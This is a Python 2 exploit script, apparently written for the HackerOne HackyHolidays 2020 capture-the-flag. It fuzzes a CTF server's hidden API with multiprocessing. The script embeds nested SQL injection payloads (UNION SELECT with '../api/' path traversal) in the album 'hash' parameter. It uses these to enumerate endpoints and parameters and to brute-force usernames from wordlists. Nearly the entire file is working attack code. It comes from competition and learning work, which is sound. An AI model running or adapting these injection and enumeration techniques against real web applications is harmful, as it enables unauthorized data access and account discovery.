#
# Python 2 API Fuzzer w/ Multiprocessing
#
# Author: https://github.com/limerencee
# Created during: HackerOne HackyHolidays 2020 CTF
#
#
# Usage:
# In main(), decide if you want to run full_enum() or the speed_run()
# by commenting out either functions. Adjust the number of threads under
# POOL_WORKERS global variable (default 12).
#
# $ pip install bs4 && python r3c0n-server-exploit.py
#

import requests
import sys
from bs4 import BeautifulSoup
from multiprocessing import Pool

POOL_WORKERS = 12

retry = []
pool = None

def log_result(result):
    global retry

    if result:
        if result[1]:
            print "  [+] {}".format(result[0])
            print "  [+] Link: {}\n".format(result[1])
        else:
            print "  [!] {}".format(result[0])
            print "  [!] Added to retry list"
            retry.append(result[0])

def multi_request_api(base, word):
    s = requests.Session()

    # Fuzz and get the generated link
    res1 = s.get(base.replace('FUZZ', word))
    soup = BeautifulSoup(res1.content, features="html.parser")
    
    # Check if the end-point exists
    link = 'https://hackyholidays.h1ctf.com' + soup.find("img", {"class": "img-responsive"})['src']
    res2 = s.get(link)

    # Server instabilities
    if 'Received: 500' in res2.text:
        return [word, None]
    
    # Wrong guess
    if  'Received: 0' in res2.text or \
        'Received: 400' in res2.text or \
        'Received: 404' in res2.text or \
        'Invalid content type' in res2.text:
        return False

    return [word, link]

def multi_request_user(base, word):
    s = requests.Session()

    # Fuzz and get the generated link
    res1 = s.get(base.replace('FUZZ', word))
    soup = BeautifulSoup(res1.content, features="html.parser")
    
    # Check if the end-point exists
    link = 'https://hackyholidays.h1ctf.com' + soup.find("img", {"class": "img-responsive"})['src']
    res2 = s.get(link)

    # Server instabilities
    if 'Received: 500' in res2.text:
        return [word, None]
    
    # Wrong guess
    if 'Received: 204' in res2.text:
        return False

    return [word, link]

def fuzz_api(wordlist):
    global pool, retry
    pool = Pool(POOL_WORKERS)

    base = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,1,%27../api/FUZZ%27%20--%20-%22,1,1--%20-'

    print "[+] Discovered end-point(s): "
    with open(wordlist, 'r') as file:
        words = file.readlines()
        words = [word.strip() for word in words]
        for word in words:
            pool.apply_async(multi_request_api, [base, word], callback=log_result)

    while len(retry) > 0:
        print "[+] Retrying failed words..."
        for word in retry:
            pool.apply_async(multi_request_api, [base, word], callback=log_result)
        retry = []

    pool.close()
    pool.join()

def fuzz_param(wordlist):
    global pool, retry
    pool = Pool(POOL_WORKERS)

    base = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,1,%27../api/ping%3FFUZZ%3Da%27%20--%20-%22,1,1--%20-'
    #base = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,1,%27../api/user%3FFUZZ%3Da%27%20--%20-%22,1,1--%20-'

    print "[+] Discovered parameters(s): "
    with open(wordlist, 'r') as file:
        words = file.readlines()
        words = [word.strip() for word in words]
        for word in words:
            pool.apply_async(multi_request_api, [base, word], callback=log_result)

    while len(retry) > 0:
        print "[+] Retrying failed words..."
        for word in retry:
            pool.apply_async(multi_request_api, [base, word], callback=log_result)
        retry = []

    pool.close()
    pool.join()

def fuzz_user(wordlist):
    global pool, retry
    pool = Pool(POOL_WORKERS)

    base = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,1,%27../api/user%3Fusername%3DFUZZ%26password%3Da%27%20--%20-%22,1,1--%20-'

    print "[+] Discovered user(s): "
    with open(wordlist, 'r') as file:
        words = file.readlines()
        words = [word.strip() for word in words]
        for word in words:
            pool.apply_async(multi_request_user, [base, word], callback=log_result)

    while len(retry) > 0:
        print "[+] Retrying failed words..."
        for word in retry:
            pool.apply_async(multi_request_user, [base, word], callback=log_result)
        retry = []

    pool.close()
    pool.join()

def main():
    #fuzz_api(sys.argv[1])      # https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects.txt
    fuzz_param(sys.argv[1])     # https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt
    #fuzz_user(sys.argv[1])     #

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "Usage: {} /path/to/wordlist".format(sys.argv[0])
        sys.exit(1)
    main()
